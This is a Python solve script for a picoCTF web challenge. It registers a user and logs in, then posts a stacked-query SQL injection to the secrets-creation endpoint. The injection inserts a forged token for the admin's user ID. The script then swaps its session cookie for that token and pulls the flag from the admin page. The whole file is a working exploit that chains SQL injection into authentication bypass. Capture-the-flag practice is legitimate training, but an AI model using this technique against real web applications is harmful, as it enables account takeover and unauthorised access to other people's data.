#!/usr/bin/env python3
import random
import re
import string
import sys

import requests

BASE = "http://candy-mountain.picoctf.net:61655"
ADMIN_ID = "e2a66f7d-2ce6-4861-b4aa-be8e069601cb"


def randstr(n=12):
    alphabet = string.ascii_lowercase + string.digits
    return "".join(random.choice(alphabet) for _ in range(n))


def extract_flag(text):
    m = re.search(r"picoCTF\{.*?\}", text, re.DOTALL)
    return m.group(0) if m else None


def main():
    s = requests.Session()

    username = f"user_{randstr()}"
    password = f"pass_{randstr()}"
    forged_token = f"tok_{randstr(20)}"

    print(f"[+] Creating user: {username}:{password}")

    # Step 1: sign up
    r = s.post(
        f"{BASE}/signup",
        data={"username": username, "password": password},
        allow_redirects=True,
        timeout=10,
    )
    if r.status_code != 200:
        print("[-] Signup failed")
        sys.exit(1)

    # Step 2: log in as our user
    print("[+] Logging in")
    r = s.post(
        f"{BASE}/login",
        data={"username": username, "password": password},
        allow_redirects=True,
        timeout=10,
    )
    if r.status_code != 200:
        print("[-] Login failed")
        sys.exit(1)

    # Step 3: SQLi in /secrets/create to create a valid token for admin
    #
    # Vulnerable query:
    # INSERT INTO secrets(owner_id, content) VALUES ('<userId>', '<content>')
    #
    # We close the content string, insert our own statement, then comment out the rest.
    payload = (
        "x'); "
        f"INSERT INTO tokens(id, user_id, expired_at) "
        f"VALUES ('{forged_token}', '{ADMIN_ID}', NOW() + interval '1 day'); --"
    )

    print("[+] Injecting forged admin token")
    r = s.post(
        f"{BASE}/secrets/create",
        data={"content": payload},
        allow_redirects=True,
        timeout=10,
    )

    # Step 4: replace our cookie with the forged admin token
    s.cookies.set("auth_token", forged_token)

    # Step 5: request the homepage as admin and extract the flag
    print("[+] Fetching admin secrets")
    r = s.get(f"{BASE}/", timeout=10)
    flag = extract_flag(r.text)

    if flag:
        print(f"[+] FLAG FOUND: {flag}")
    else:
        print("[-] Flag not found")
        print(r.text)


if __name__ == "__main__":
    main()
